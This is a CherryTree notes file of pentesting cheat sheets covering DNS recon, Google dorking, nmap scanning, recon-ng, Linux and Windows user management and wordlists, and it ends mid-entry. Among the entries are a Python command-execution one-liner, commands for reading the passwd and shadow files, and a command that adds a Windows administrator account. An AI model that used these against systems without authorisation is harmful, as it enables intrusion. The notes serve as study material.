<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="General" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1695157186" ts_lastsave="1702907635">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>



</rich_text>
    <node name="Passive Recon" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695238541" ts_lastsave="1697102226">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whois </rich_text>
      <rich_text weight="heavy">DOMAIN</rich_text>
      <rich_text>

nslookup -type=</rich_text>
      <rich_text weight="heavy">TYPE</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">DOMAIN</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">SERVER</rich_text>
      <rich_text>

dig @</rich_text>
      <rich_text weight="heavy">SERVER</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">DOMAIN</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">TYPE</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">types:
A 				IPv4 Addresses
AAAA 		IPv6 Addresses
CNAME 	Canonical Name
MX 			Mail Servers
SOA 			Start of Authority
TXT 			TXT Records</rich_text>
      <rich_text>


</rich_text>
      <rich_text link="webs https://dnsdumpster.com/">https://dnsdumpster.com/</rich_text>
      <rich_text>
Online DNS tool

</rich_text>
      <rich_text link="webs https://www.shodan.io">https://www.shodan.io</rich_text>
      <rich_text>
</rich_text>
    </node>
    <node name="Website" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695157757" ts_lastsave="1698762292">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

HTTP status codes:
200 = OK
401 = Unauthorized

Robots.txt:
</rich_text>
      <rich_text indent="1">The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.</rich_text>
      <rich_text>

Sitemap.xml
</rich_text>
      <rich_text indent="1">Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.</rich_text>
      <rich_text>

Favicon database:
</rich_text>
      <rich_text indent="1">search with MD5 hash of the favicon.img file
</rich_text>
      <rich_text indent="1" link="webs https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</rich_text>
    </node>
    <node name="Flat DB files" unique_id="71" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697980166" ts_lastsave="1699440296">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Working with flat DB files
</rich_text>
      <rich_text indent="1">example.db</rich_text>
      <rich_text>

Check which version:
</rich_text>
      <rich_text indent="1">file </rich_text>
      <rich_text indent="1" weight="heavy">FILENAME.db</rich_text>
      <rich_text>

sqlite3:
</rich_text>
      <rich_text indent="1">Client:
</rich_text>
      <rich_text indent="2">sqlite3 </rich_text>
      <rich_text indent="2" weight="heavy">FILENAME.db</rich_text>
      <rich_text indent="1">
show all tables:
</rich_text>
      <rich_text indent="2">.tables</rich_text>
      <rich_text indent="1">
Show columns of a table:
</rich_text>
      <rich_text indent="2">PRAGMA table_info(</rich_text>
      <rich_text indent="2" weight="heavy">TABLENAME</rich_text>
      <rich_text indent="2">);</rich_text>
      <rich_text indent="1">
Get all records:
</rich_text>
      <rich_text indent="2">SELECT * FROM </rich_text>
      <rich_text indent="2" weight="heavy">TABLENAME</rich_text>
      <rich_text indent="2">;</rich_text>
      <rich_text>


</rich_text>
    </node>
    <node name="Google Dorking" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158112" ts_lastsave="1697102233">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
site
</rich_text>
      <rich_text indent="1">returns results only from the specified website address
site:</rich_text>
      <rich_text indent="1" weight="heavy">tryhackme.com</rich_text>
      <rich_text>

inurl
</rich_text>
      <rich_text indent="1">returns results that have the specified word in the URL
inurl:</rich_text>
      <rich_text indent="1" weight="heavy">admin</rich_text>
      <rich_text>

filetype
</rich_text>
      <rich_text indent="1">returns results which are a particular file extension
filetype:</rich_text>
      <rich_text indent="1" weight="heavy">pdf</rich_text>
      <rich_text>

intitle
</rich_text>
      <rich_text indent="1">returns results that contain the specified word in the title
intitle:</rich_text>
      <rich_text indent="1" weight="heavy">admin</rich_text>
      <rich_text>


</rich_text>
      <rich_text link="webs https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</rich_text>
    </node>
  </node>
  <node name="Scripting" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1702907635" ts_lastsave="1702911773">
    <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1702907639">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Execute bash commands:
</rich_text>
      <rich_text indent="1">import os; print(os.popen("</rich_text>
      <rich_text indent="1" weight="heavy">COMMAND</rich_text>
      <rich_text indent="1">").read())</rich_text>
      <rich_text>

Webserver:
</rich_text>
      <rich_text indent="1">python3 -m http.server </rich_text>
      <rich_text weight="heavy">PORT</rich_text>
    </node>
    <node name="Bash" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702907342" ts_lastsave="1702907641">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

for i in {</rich_text>
      <rich_text weight="heavy">START</rich_text>
      <rich_text>..</rich_text>
      <rich_text weight="heavy">END</rich_text>
      <rich_text>..</rich_text>
      <rich_text weight="heavy">INCREMENT</rich_text>
      <rich_text>}
do 
  </rich_text>
      <rich_text weight="heavy">SCRIPT</rich_text>
      <rich_text>
done</rich_text>
    </node>
  </node>
  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699882207">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
list in tree view
</rich_text>
    <rich_text indent="1">tree -L </rich_text>
    <rich_text indent="1" weight="heavy">LAYERS</rich_text>
    <rich_text>

hash krijgen:
</rich_text>
    <rich_text indent="1">md5sum</rich_text>
    <rich_text> </rich_text>
    <rich_text weight="heavy">FILE</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">sha1sum</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">sha256sum</rich_text>
    <rich_text>

whoami
id
ifconfig
ip addr
uname -a
ps -ef

Kali:
</rich_text>
    <rich_text indent="1">setxkbmap -layout be</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">setxkbmap -layout us</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">apt install -y kali-linux-everything</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">apt install -y kali-linux-default</rich_text>
    <rich_text>

alternative to cat -&gt; less

list installed packages:
</rich_text>
    <rich_text indent="1">apt list --installed</rich_text>
    <rich_text>

list available shells:
</rich_text>
    <rich_text indent="1">cat /etc/shells</rich_text>
    <rich_text>

unzip .gz files
</rich_text>
    <rich_text indent="1">gunzip </rich_text>
    <rich_text indent="1" weight="heavy">FILE</rich_text>
    <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1699618791">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New user:
</rich_text>
      <rich_text indent="1">useradd </rich_text>
      <rich_text indent="1" weight="heavy">OPTIONS</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">-m -&gt; create home</rich_text>
      <rich_text> directory
</rich_text>
      <rich_text indent="2">-M -&gt; no home</rich_text>
      <rich_text> directory

Delete user:
</rich_text>
      <rich_text indent="1">userdel </rich_text>
      <rich_text indent="1" weight="heavy">OPTIONS</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">-f -&gt; force</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">-r -&gt; remove home directory</rich_text>
      <rich_text>

Change password:
</rich_text>
      <rich_text indent="1">passwd </rich_text>
      <rich_text weight="heavy">USERNAME</rich_text>
      <rich_text>

Change group:
</rich_text>
      <rich_text indent="1">usermod -aG </rich_text>
      <rich_text indent="1" weight="heavy">GROUP</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text>

Change shell:
</rich_text>
      <rich_text indent="1">chsh -s </rich_text>
      <rich_text indent="1" weight="heavy">SHELL</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">/bin/bash</rich_text>
      <rich_text>

show info of a user:
</rich_text>
      <rich_text indent="1">id </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text>

List all users:
</rich_text>
      <rich_text indent="1">cat /etc/passwd</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">getent passwd</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">username : encrypted password : userID : groupID : fullname : home directory : shell</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">getent </rich_text>
      <rich_text>shadow
</rich_text>
      <rich_text indent="2">username : encrypted password  : last pw change : min pw change : max pw change : pw change warn : </rich_text>
      <rich_text>days inactive : exp date
</rich_text>
      <rich_text indent="2">encrypted password = $id $ salt $ hashed</rich_text>
      <rich_text indent="3">
</rich_text>
      <rich_text indent="5">$1$ is MD5
$2a$ is Blowfish
$2y$ is Blowfish
$5$ is SHA-256
$6$ is SHA-512
$y$ is yescrypt
 
</rich_text>
      <rich_text>
List normal users/groups:
</rich_text>
      <rich_text indent="1">first get the min and max UIDs for normal users/groups:
</rich_text>
      <rich_text indent="2">grep -E '^UID_MIN|^UID_MAX' /etc/login.defs</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">grep -E '^GID_MIN|^GID_MAX' /etc/login.defs</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">filter the passwd/group file:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">getent passwd {</rich_text>
      <rich_text indent="2" weight="heavy">MIN</rich_text>
      <rich_text indent="2">..</rich_text>
      <rich_text indent="2" weight="heavy">MAX</rich_text>
      <rich_text indent="2">}</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">getent passwd {1000..60000}</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">getent group {1000..60000}</rich_text>
    </node>
    <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1699887014">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Locate a file:
</rich_text>
      <rich_text indent="1">locate </rich_text>
      <rich_text indent="1" weight="heavy">NAME</rich_text>
      <rich_text>

Search name case sensitive:
</rich_text>
      <rich_text indent="1">find -name “</rich_text>
      <rich_text indent="1" weight="heavy">NAME</rich_text>
      <rich_text indent="1">"</rich_text>
      <rich_text>

Search name case insensitive:
</rich_text>
      <rich_text indent="1">find -iname “</rich_text>
      <rich_text indent="1" weight="heavy">NAME</rich_text>
      <rich_text indent="1">"</rich_text>
      <rich_text>

Wildcard for name:
</rich_text>
      <rich_text indent="1">*</rich_text>
      <rich_text>

Search files:
</rich_text>
      <rich_text indent="1">-type f</rich_text>
      <rich_text>

Search directories:
</rich_text>
      <rich_text indent="1">-type d</rich_text>
      <rich_text>


</rich_text>
    </node>
    <node name="Wordlists" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695159329" ts_lastsave="1699440329">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Seclists:
git clone </rich_text>
      <rich_text link="webs https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</rich_text>
      <rich_text>
apt-get install seclists

/usr/share/seclists</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">├── Discovery
├── Fuzzing
├── IOCs
├── Miscellaneous
├── Passwords
├── Pattern-Matching
├── Payloads
├── Usernames
└── Web-Shells</rich_text>
      <rich_text>

Subdomains:
</rich_text>
      <rich_text indent="1">/usr/share/seclists/Discovery/DNS/subdomains</rich_text>
      <rich_text>

Directory :
</rich_text>
      <rich_text indent="1">/usr/share/seclists/Discovery/Web-Content/directory-list</rich_text>
      <rich_text>

Passwords:
</rich_text>
      <rich_text indent="1">/usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text>


</rich_text>
    </node>
    <node name="SSH" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699440329" ts_lastsave="1699441136">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Generate SSH keypair:
</rich_text>
      <rich_text indent="1">ssh-keygen</rich_text>
      <rich_text>

Access via key:
</rich_text>
      <rich_text indent="1">copy public key to the target</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">ssh-copy-id</rich_text>
      <rich_text>

Private key needs to be 600:
id_rsa file as ID needs chmod 600</rich_text>
    </node>
  </node>
  <node name="Windows Basics" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="121" is_bold="0" foreground="" ts_creation="1699536444" ts_lastsave="1699536968">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
</rich_text>
    <node name="User Management" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699536444" ts_lastsave="1699536489">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New user:
</rich_text>
      <rich_text indent="1">net user </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">PASSWORD</rich_text>
      <rich_text indent="1"> /add</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">net localgroup administrators </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1"> /add</rich_text>
    </node>
  </node>
  <node name="Recon" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694980338" ts_lastsave="1697102173">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
</rich_text>
    <node name="General Recon" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1695235115" ts_lastsave="1697102432">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ping -c </rich_text>
      <rich_text weight="heavy">COUNT </rich_text>
      <rich_text>-i </rich_text>
      <rich_text weight="heavy">INTERVAL </rich_text>
      <rich_text>-s</rich_text>
      <rich_text weight="heavy"> BYTES IP</rich_text>
      <rich_text>

telnet </rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">PORT</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">tcp connection. For example HTTP:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">GET / HTTP/1.1</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">host: x</rich_text>
      <rich_text>

</rich_text>
    </node>
    <node name="Recon-ng" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1695467525" ts_lastsave="1697102244">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
      <rich_text weight="heavy">Uses different modules to recon a target. Results will be neatly organised in a DB</rich_text>
      <rich_text>

use ? for available commands

usage: recon-ng [-h] [-w workspace] [-r filename] [--no-version]
                [--no-analytics] [--no-marketplace] [--stealth] [--accessible]
                [--version]

recon-ng - Tim Tomes (@lanmaster53)

options:
</rich_text>
      <rich_text indent="1">  -h, --help        show this help message and exit
  -w workspace      load/create a workspace
  -r filename       load commands from a resource file
  --no-version      disable version check. Already disabled by default in
                    Debian
  --no-analytics    disable analytics reporting. Already disabled by default
                    in Debian
  --no-marketplace  disable remote module management
  --stealth         disable all passive requests (--no-*)
  --accessible      Use accessible outputs when available
  --version         displays the current version</rich_text>
      <rich_text>
</rich_text>
      <node name="Preparation" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695467525" ts_lastsave="1695469748">
        <rich_text>start:
</rich_text>
        <rich_text indent="1">recon-ng</rich_text>
        <rich_text>

start with specific workplace (will create if not exists):
</rich_text>
        <rich_text indent="1">recon-ng -w </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text>

workspace management:</rich_text>
        <rich_text indent="1">
workspaces</rich_text>
        <rich_text> </rich_text>
        <rich_text indent="2">create </rich_text>
        <rich_text indent="2" weight="heavy">NAME</rich_text>
        <rich_text indent="2">
</rich_text>
        <rich_text indent="1">workspaces load </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="1">
workspaces remove </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="1">workspaces</rich_text>
        <rich_text> list

Marketplace usage:
</rich_text>
        <rich_text indent="1">marketplace search </rich_text>
        <rich_text indent="1" weight="heavy">KEYWORD</rich_text>
        <rich_text indent="1">
marketplace info </rich_text>
        <rich_text indent="1" weight="heavy">MODULE</rich_text>
        <rich_text indent="1">
marketplace install </rich_text>
        <rich_text indent="1" weight="heavy">MODULE</rich_text>
        <rich_text indent="1"> 
marketplace remove </rich_text>
        <rich_text indent="1" weight="heavy">MODULE</rich_text>
        <rich_text>


</rich_text>
      </node>
      <node name="Use" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695469259" ts_lastsave="1695470079">
        <rich_text>db management:</rich_text>
        <rich_text indent="1">
db delete </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="2">
</rich_text>
        <rich_text indent="1">db insert </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="1">
db notes </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="1">
db query </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="2">
</rich_text>
        <rich_text indent="1">db schema = show all </rich_text>
        <rich_text>

Modules management:</rich_text>
        <rich_text indent="1">
modules</rich_text>
        <rich_text> </rich_text>
        <rich_text indent="2">load </rich_text>
        <rich_text indent="2" weight="heavy">NAME</rich_text>
        <rich_text indent="2">
</rich_text>
        <rich_text indent="1">modules reload </rich_text>
        <rich_text indent="1" weight="heavy">NAME</rich_text>
        <rich_text indent="1">
modules search </rich_text>
        <rich_text indent="1" weight="heavy">KEYWORD</rich_text>
        <rich_text>

Show info on loaded module:
</rich_text>
        <rich_text indent="1">info</rich_text>
        <rich_text>
CTRL + C unloads the module

Options management:
</rich_text>
        <rich_text indent="1">options list
options set </rich_text>
        <rich_text indent="1" weight="heavy">OPTION</rich_text>
        <rich_text indent="1"> </rich_text>
        <rich_text indent="1" weight="heavy">VALUE</rich_text>
        <rich_text indent="1">
options unset</rich_text>
        <rich_text>
Options will set default values which will be taken from the DB running a query, see run ‘info’ for details
Run the query (db query) to see which value will be used

execute a module:
</rich_text>
        <rich_text indent="1">run</rich_text>
        <rich_text>





</rich_text>
      </node>
    </node>
    <node name="NMAP" unique_id="2" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694980362" ts_lastsave="1700046220">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sC -sV -Pn -p 0-10000 </rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>

smb enum:
</rich_text>
      <rich_text indent="1">nmap -p </rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1"> --script=smb-enum-shares.nse,smb-enum-users.nse </rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>

</rich_text>
      <node name="Host discovery" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1694980811" ts_lastsave="1697102484">
        <rich_text style="italic">see also masscan -&gt; more aggressive -&gt; faster</rich_text>
        <rich_text>

Multiple Targets:
</rich_text>
        <rich_text indent="1">10.11.12.15-20
192.168.1.0/24
IP1 IP2 IP3</rich_text>
        <rich_text>

use hostfile
</rich_text>
        <rich_text indent="1">nmap -iL </rich_text>
        <rich_text indent="1" weight="heavy">TARGETS.TXT</rich_text>
        <rich_text>

List chosen targets without reverse-DNS
</rich_text>
        <rich_text indent="1">nmap -sL -n </rich_text>
        <rich_text indent="1" weight="heavy">TARGET</rich_text>
        <rich_text>

Disable portscan:
</rich_text>
        <rich_text indent="1">-sn</rich_text>
        <rich_text>
Disable reverse-DNS:
</rich_text>
        <rich_text indent="1">-n</rich_text>
        <rich_text>
Enable reverse-DNS also on offline hosts:
</rich_text>
        <rich_text indent="1">-R</rich_text>
        <rich_text>
Specify DNS server
</rich_text>
        <rich_text indent="1"> --dns-servers </rich_text>
        <rich_text indent="1" weight="heavy">DNS_SERVER</rich_text>
        <rich_text>

ARP:
</rich_text>
        <rich_text indent="1" style="italic">See also ARP-Scan</rich_text>
        <rich_text>

</rich_text>
        <rich_text indent="1">scan alive local-hosts (ARP) NO PORTS SCANNED!
</rich_text>
        <rich_text indent="2">map -PR -sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text>

ICMP:
</rich_text>
        <rich_text indent="1">scan alive hosts (ICMP echo) NO PORTS SCANNED!
</rich_text>
        <rich_text indent="2">nmap -PE -sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text indent="1">

scan alive hosts (ICMP timestamp) NO PORTS SCANNED!
</rich_text>
        <rich_text indent="2">nmap -PP -sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text indent="1">

scan alive hosts (ICMP mask) NO PORTS SCANNED!
</rich_text>
        <rich_text indent="2">nmap -PM -sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text>

TCP/UDP:
</rich_text>
        <rich_text indent="1">default port 80

SYN ping (RST or SYN/ACK means live host)
</rich_text>
        <rich_text indent="2">sudo nmap -PS</rich_text>
        <rich_text indent="2" weight="heavy">PORT(S) </rich_text>
        <rich_text indent="2">-sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text indent="1">

ACK ping (RST means live host)
</rich_text>
        <rich_text indent="2">sudo nmap -PA</rich_text>
        <rich_text indent="2" weight="heavy">PORT(S) </rich_text>
        <rich_text indent="2">-sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text>

</rich_text>
        <rich_text indent="1">UDP ping (ping uncommon port to get ICMP destination unreachable (port unreachable) error -&gt; live host)
</rich_text>
        <rich_text indent="2">sudo nmap -PU</rich_text>
        <rich_text indent="2" weight="heavy">PORT(S) </rich_text>
        <rich_text indent="2">-sn </rich_text>
        <rich_text indent="2" weight="heavy">TARGET</rich_text>
        <rich_text>







</rich_text>
      </node>
      <node name="Services &amp; Ports" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242135" ts_lastsave="1699971757">
        <rich_text>Multiple Targets:
</rich_text>
        <rich_text indent="1">10.11.12.15-20
192.168.1.0/24
IP1 IP2 IP3</rich_text>
        <rich_text>

use hostfile
</rich_text>
        <rich_text indent="1">nmap -iL </rich_text>
        <rich_text indent="1" weight="heavy">TARGETS.TXT</rich_text>
        <rich_text>

List chosen targets without reverse-DNS
</rich_text>
        <rich_text indent="1">nmap -sL -n </rich_text>
        <rich_text indent="1" weight="heavy">TARGET</rich_text>
        <rich_text>

scan with default script &amp; service detection
</rich_text>
        <rich_text indent="1">nmap -sC -sV </rich_text>
        <rich_text indent="1" weight="heavy">TARGET</rich_text>
        <rich_text>

scan with service detection
</rich_text>
        <rich_text indent="1">nmap  -sV </rich_text>
        <rich_text indent="1" weight="heavy">TARGET</rich_text>
        <rich_text>

all ports:
</rich_text>
        <rich_text indent="1">-p- </rich_text>
        <rich_text>

specify ports:
</rich_text>
        <rich_text indent="1">-p </rich_text>
        <rich_text indent="1" weight="heavy">RANGE</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">x,x,x-x,x-x</rich_text>
        <rich_text>

-</rich_text>
        <rich_text indent="1">O: Enable OS detection</rich_text>
        <rich_text>

-T&lt;0-5&gt;: Set timing template (higher is faster)











</rich_text>
      </node>
      <node name="NSE scripts" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1696527444" ts_lastsave="1696528645">
        <rich_text>Categories (</rich_text>
        <rich_text indent="1" link="webs https://nmap.org/book/nse-usage.html">https://nmap.org/book/nse-usage.html</rich_text>
        <rich_text>):
</rich_text>
        <rich_text indent="1">safe:- Won't affect the target
intrusive:- Not safe: likely to affect the target
vuln:- Scan for vulnerabilities
exploit:- Attempt to exploit a vulnerability
auth:- Attempt to bypass authentication for running services
brute:- Attempt to bruteforce credentials for running services
discovery:- Attempt to query running services for further information about the network</rich_text>
        <rich_text>

Script info: </rich_text>
        <rich_text link="webs https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</rich_text>
        <rich_text> 

Script location: /usr/share/nmap/scripts

Add missing script:
</rich_text>
        <rich_text indent="1">sudo wget -O /usr/share/nmap/scripts/</rich_text>
        <rich_text indent="1" weight="heavy">SCRIPTNAME</rich_text>
        <rich_text indent="1">.nse </rich_text>
        <rich_text>https://svn.nmap.org/nmap/scripts/SCRIPTNAME.nse
</rich_text>
        <rich_text indent="1">nmap --script-updatedb</rich_text>
        <rich_text>



--script-help </rich_text>
        <rich_text weight="heavy">SCRIPT</rich_text>
        <rich_text>

--script=</rich_text>
